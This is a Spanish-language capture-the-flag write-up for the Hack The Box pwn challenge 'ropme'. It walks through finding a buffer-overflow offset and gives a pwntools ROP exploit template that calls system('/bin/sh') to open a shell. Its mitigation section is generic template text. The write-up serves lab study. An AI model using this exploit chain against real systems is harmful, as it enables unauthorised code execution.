---
challenge: ropme
type: Pwn
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [pwn, buffer-overflow, rop, pwntools, elf]
---


# ropme — Hack The Box (Challenge)

[🇬🇧 English](README.en.md) | **Español**

## TL;DR

- Ver las secciones adyacentes para el detalle.

## Enunciado y superficie

Binario ELF con un `read()` que escribe más de lo que cabe en el buffer. Sin canario aparente y con una función que ya llama a `system`. El objetivo es controlar `RIP` y encadenar un ROP mínimo.

## Reconocimiento

```bash
file ropme; checksec --file=ropme
objdump -d ropme | grep -E "<(main|system|win|vuln)>"
strings -a ropme | grep -E "/bin/sh|flag"
```

`checksec` dice si hay NX, PIE y canario. Si PIE está desactivado, las direcciones del binario son fijas; con NX hay que usar ROP, no shellcode.

## Análisis del código

- El reto no entrega código fuente; el análisis se apoya en el comportamiento descrito en «Explicación del fallo».

## Explicación del fallo

```bash
python3 -c "from pwn import *; print(cyclic(200))" > pat
./ropme < pat          # o enviarlo por el socket
dmesg | tail -3        # RIP = 0x616161...
python3 -c "from pwn import *; print(cyclic_find(0x6161616c))"
```

Con `gdb` y `pwndbg`: `pattern create 200`, luego `pattern offset $rsp`.

## Reproducción local

- Ejecuta el binario en local con la misma libc y depura con `gdb`/`pwndbg`.
- Compara el offset local con el del servicio remoto antes de lanzar el exploit.

## Explotación

Se necesita `pop rdi; ret` para pasar `/bin/sh` a `system`:

```bash
ROPgadget --binary ropme | grep "pop rdi"
objdump -d ropme | grep "<system@plt>"
```

```python
from pwn import *
context.binary = elf = ELF('./ropme')
p = process('./ropme')          # o remote('<IP>', <PORT>)
p.sendline(flat({
    0: b'A'*<offset>,
    <offset>: p64(elf.symbols.get('pop_rdi', <POP_RDI>)),
    <offset+8>: p64(next(elf.search(b'/bin/sh'))),
    <offset+16>: p64(elf.plt['system']),
}))
p.interactive()
```

Si no hay `/bin/sh` en el binario, se escribe en `.bss` con `gets`/`read` y se llama con `pop rdi`.

## Evidencia

- Salidas recortadas de los comandos clave; sin flags, credenciales ni tokens.
- Los valores reales viven en `private/` y no se publican.

## Lecciones aprendidas

- **`SIGSEGV` antes de llegar a `ret`** → el offset está mal; el buffer puede tener otro tamaño o hay alineación.
- **`system` no ejecuta** → falta alinear la pila a 16 bytes; añade un `ret` antes del `pop rdi`.
- **`/bin/sh` no existe** → escribe la cadena en `.bss` con `read` y usa su dirección.
- **Funciona en local y no en remoto** → libc distinta; si el reto da la libc, calcula `system` con `libc.symbols`.

- `checksec` decide la estrategia antes de escribir una línea de exploit.
- El offset se mide, no se adivina.
- La alineación de pila es la causa número uno de fallos intermitentes en ROP.

MITRE: T1203, T1059.

## Mitigaciones y detección

- Aplicar la corrección de la categoría: validación en servidor, versiones parcheadas y mínimo privilegio.
- Detección: revisar los logs de la aplicación y alertar de 4xx/5xx repetidos o entradas anómalas.

## Referencias

- [MITRE T1059](https://attack.mitre.org/techniques/T1059/)
- [MITRE T1203](https://attack.mitre.org/techniques/T1203/)
- [rop-stack](../../knowledge/pwn/rop-stack.md)
